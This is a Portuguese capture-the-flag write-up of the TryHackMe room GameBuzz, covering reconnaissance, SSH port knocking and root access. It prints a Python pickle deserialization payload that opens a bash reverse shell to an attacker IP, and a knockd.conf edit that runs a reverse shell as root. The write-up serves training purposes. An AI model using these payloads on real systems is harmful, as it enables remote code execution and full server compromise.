---
title: THM GameBuzz Writeup
author: Hastur
date: 2021-09-12 21:00:00 -0300
categories: [Writeups, Try Hack Me]
tags: [THM, Linux, Hard, Web, Serialize, Port Knocking]
image: /img/thm/thm-gamebuzz-logo.png
alt: "THM GameBuzz Writeup"
---

<img src="/img/thm/thm-gamebuzz-logo.png">

<br>


| Nome | [GameBuzz](https://tryhackme.com/room/gamebuzz)    |
|------|-------------|
|OS    | Linux       |
|Nível | Hard      |

<br>

## RECON


### Nmap
```bash
┌──(hastur㉿hastur)-[~/GameBuzz]
└─$ sudo nmap -v -p- -sCV -O -Pn 10.10.102.61 --min-rate=512
PORT   STATE    SERVICE VERSION
22/tcp filtered ssh
80/tcp open     http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Incognito

```

O nmap nos trouxe somente a porta 80 aberta e a porta 22 com algum bloqueio, que ainda não sabemos o tipo, então o vetor de entrada será pelo website.

### Porta 80

<img src="/img/thm/thm-gamebuzz-1.png">

Encontramos uma página sobre games. Ao analisar a página, encontrei uma informação relevante nos contatos, o email `admin@incognito.com`, o que significa que teremos que adicionar o domínio em `/etc/hosts`.

Enumerando a página, encontramos um único link funcional `Game Ratings` que traz informações sobre três jogos diferentes.

<img src="/img/thm/thm-gamebuzz-2.png">

Decidi analizar a requisição com o `BURP`.

<img src="/img/thm/thm-gamebuzz-3.png">

Aparentemente o link faz uma requisição para um objeto `serializado` que se encontra  no endereço `/var/upload/games/`, talvez possamos utilizar um payload serializado, mas ainda não temos um vetor de entrada.

A varredura de diretórios não revelou nada útil, então decidi fazer uma busca por subdomínios.

```bash
┌──(hastur㉿hastur)-[~/GameBuzz]
└─$ gobuster dns -d incognito.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Domain:     incognito.com
[+] Threads:    10
[+] Timeout:    1s
[+] Wordlist:   /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
===============================================================
2021/09/12 22:40:02 Starting gobuster in DNS enumeration mode
===============================================================
Found: autodiscover.incognito.com
Found: dev.incognito.com         
Found: www.incognito.com         
Found: blog.incognito.com        
Found: ns2.incognito.com         
Found: old.incognito.com         
Found: ns3.incognito.com         
Found: support.incognito.com     
Found: demo.incognito.com        
Found: ns4.incognito.com         
Found: video.incognito.com       
Found: api.incognito.com         
Found: staging.incognito.com     
Found: sip.incognito.com         
Found: info.incognito.com        
Found: help.incognito.com        
Found: www4.incognito.com        
Found: docs.incognito.com        
Found: nagios.incognito.com      
Found: access.incognito.com      
Found: dl.incognito.com          
Found: lyncdiscover.incognito.com
Found: jira.incognito.com        
Found: www6.incognito.com        
Found: go.incognito.com          
Found: calendar.incognito.com    
Found: assets.incognito.com      
Found: pbx.incognito.com 
Found: sites.incognito.com       
Found: is.incognito.com          
Found: repository.incognito.com  
Found: groups.incognito.com      
Found: stun.incognito.com        
Found: ice.incognito.com         
Found: sbc.incognito.com         
Found: metis.incognito.com       
Found: calypso.incognito.com     
Found: prometheus.incognito.com  
```
A busca trouxe vários subdomínios, mas o mais interessante pareceu `dev.incognito.com`, depois de adicioná-lo em `/etc/hosts`, acessei a página.

<img src="/img/thm/thm-gamebuzz-4.png">

Encontramos uma página permitida somente para desenvolvedores, ao checar a existência do `/robots.txt`, encontrei um diretório desabilitado.

<img src="/img/thm/thm-gamebuzz-5.png">

Ao acessar a página, obtive a resposta de diretório proibido pelo servidor.

<img src="/img/thm/thm-gamebuzz-6.png">

Porém, como encontrei como desabilitado no robots.txt, decidi fazer uma varredura de diretórios.

```bash
┌──(hastur㉿hastur)-[~/GameBuzz]
└─$ gobuster dir -e -u http://dev.incognito.com/secret/ -w /usr/share/wordlists/dirb/common.txt -r 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dev.incognito.com/secret/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Follow Redirect:         true
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2021/09/12 22:47:04 Starting gobuster in directory enumeration mode
===============================================================
http://dev.incognito.com/secret/.hta                 (Status: 403) [Size: 282]
http://dev.incognito.com/secret/.htaccess            (Status: 403) [Size: 282]
http://dev.incognito.com/secret/.htpasswd            (Status: 403) [Size: 282]
http://dev.incognito.com/secret/upload               (Status: 200) [Size: 370]
                                                                              
===============================================================
2021/09/12 22:49:28 Finished
===============================================================
```
O gobuster trouxe o diretório `/upload`, ao acessá-lo, encontrei um formulário de upload.

<img src="/img/thm/thm-gamebuzz-7.png">

Como o diretório é `/upload` e a requisição do `Game Ratings` vai para o diretório `/var/upload/games`, tavlez estejamos falando do mesmo lugar, então decidi fazer um script em `python` para serializar um payload com reverse shell.

```bash
┌──(hastur㉿hastur)-[~/GameBuzz]
└─$ cat serialize.py 
#!/usr/bin/python3

import pickle, os

class SerializedPickle(object):
    def __reduce__(self):
        return(os.system,("bash -c 'bash -i >& /dev/tcp/10.9.0.44/8443 0>&1'",))

pickle.dump(SerializedPickle(), open('hastur','wb'))
```
Este script irá salvar nosso payload em um arquivo para podermos subí-lo pelo formulário.

```bash
┌──(hastur㉿hastur)-[~/GameBuzz]
└─$ python3 serialize.py               
                                                                                                                     
┌──(hastur㉿hastur)-[~/GameBuzz]
└─$ ls -la
total 16
drwxr-xr-x  2 hastur hastur 4096 Sep 12 22:56 .
drwxr-xr-x 33 hastur hastur 4096 Sep 12 22:48 ..
-rw-r--r--  1 hastur hastur   87 Sep 12 22:56 hastur
-rw-r--r--  1 hastur hastur  236 Sep 12 22:54 serialize.py
```

Setei um `netcat` para ouvir na porta 8443 e fiz upload do payload.
Com o `BURP`, alterei a requisição do `Game Rating` para o endereço do payload.

<img src="/img/thm/thm-gamebuzz-8.png">

Ao enviar a requisição alterada, conseguimos nosso shell!!

<img src="/img/thm/thm-gamebuzz-9.png">

Ao enumerar o diretório `/home`, encontramos dois usuários.

```bash
www-data@incognito:/home$ ls -la
ls -la
total 16
drwxr-xr-x  4 root root 4096 Mar  1  2021 .
drwxr-xr-x 24 root root 4096 Aug 11 07:56 ..
drwxr-x---  7 dev1 dev1 4096 Jun 11 08:55 dev1
drwxr-xr-x  6 dev2 dev2 4096 Jun 11 07:24 dev2
```
Ao tentar mudar para o usuário `dev2`, conseguimos sem uso de senha.

```bash
www-data@incognito:/home$ su dev2
su dev2
dev2@incognito:/home$ 
```
A flag `user.txt` se encontra no diretório do usuário dev2.

Após um tempo de enumeração local, encontrei um e-mail direcionado para o usuário `dev1` em `/var/mail`.

```bash
dev2@incognito:/var/mail$ cat dev1
cat dev1
Hey, your password has been changed, dc647eb65e6711e155375218212b3964.
Knock yourself in!
```
Esta mensagem diz que a senha do usuário dev1 foi alterada para a senha informada, porém a porta 22 está bloqueada por algum serviço. Também finaliza com a frase `Knock yourself in!`, o que pode dizer que a porta 22 pode estar protegida por um serviço de `Port Knocking`.

Ao enumerar o diretório `/etc`, encontrei o arquivo `knockd.conf`, ao ler o conteúdo, encontrei a configuração do Port Knocking.

```bash
dev2@incognito:/etc$ cat knockd.conf
cat knockd.conf
[options]
        logfile = /var/log/knockd.log

[openSSH]
        sequence    = 5020,6120,7340
        seq_timeout = 15
        command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
        tcpflags    = syn

[closeSSH]
        sequence    = 9000,8000,7000
        seq_timeout = 15
        command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j REJECT
        tcpflags    = syn
```
Ele nos diz que para abrir a porta 22, precisamos mandar uma requisição sequencial com a flag `SYN` para as portas `5020, 6120 e 7340`, podemos usar o programa `knock` para abrirmos a porta 22 e tentar logar com o usuário `dev1`.

```bash
┌──(hastur㉿hastur)-[~/GameBuzz]
└─$ knock 10.10.102.61 5020 6120 7340 -d 500
```

E logo em seguida tentei a conexão `ssh` e consegui o shell.

<img src="/img/thm/thm-gamebuzz-10.png">

## Escalação de privilégios

Ao enumerar as permissões do usuário dev1, descobri que ele tem permissão administrativa para inicializar o programa `konckd`.

```bash
dev1@incognito:~$ sudo -l
[sudo] password for dev1: 
Matching Defaults entries for dev1 on incognito:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dev1 may run the following commands on incognito:
    (root) /etc/init.d/knockd
```
Ao enumerar o arquivo `/etc/knockd.conf` que já havíamos encontrado, descobri que ele tem permissões adicionais.

```bash
dev1@incognito:~$ ls -la /etc/knockd.conf 
-rw-rw-r--+ 1 root root 349 Jun 11 07:39 /etc/knockd.conf
```
O `+` nas permissões, evidencia que o arquivo tem permissões especiais, se conseguirmos editar este arquivo, podemos tentar um shell como `root`.

```bash
dev1@incognito:~$ cat /etc/knockd.conf 
[options]
        logfile = /var/log/knockd.log

[openSSH]
        sequence    = 5020,6120,7340
        seq_timeout = 15
        command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
        tcpflags    = syn

[closeSSH]
        sequence    = 9000,8000,7000
        seq_timeout = 15
        command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j REJECT
        tcpflags    = syn
```
Novamente observando o arquivo, percebemos que logo após ele receber a sequência correta de requisições, ele roda um comando no `iptables`, iso significa que talvez possamos editar esta linha para inserir um payload de conexão reversa.
Após a edição do arquivo, ficou desta forma : 

```bash
dev1@incognito:~$ cat /etc/knockd.conf 
[options]
        logfile = /var/log/knockd.log

[openSSH]
        sequence    = 5020,6120,7340
        seq_timeout = 15
        command     = /bin/bash -c 'bash -i >& /dev/tcp/10.9.0.44/8443 0>&1'
        tcpflags    = syn

[closeSSH]
        sequence    = 9000,8000,7000
        seq_timeout = 15
        command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j REJECT
        tcpflags    = syn
```
Após a edição, utilizei a permissão do usuário dev1 para reiniciar o knockd e recarregar as configurações.

```bash
dev1@incognito:~$ sudo /etc/init.d/knockd restart
[ ok ] Restarting knockd (via systemctl): knockd.service.
```

Depois disso, tudo que precisei fazer foi setar um `netcat` na porta 8443 e fazer o knocking novamente.

<img src="/img/thm/thm-gamebuzz-11.png">

E consegui o shell `root`!!
A flag `root.txt` se encontra no diretório `/root`.


<br>

E comprometemos o server!!
<br>

<img src="/htb/hackerman.gif">


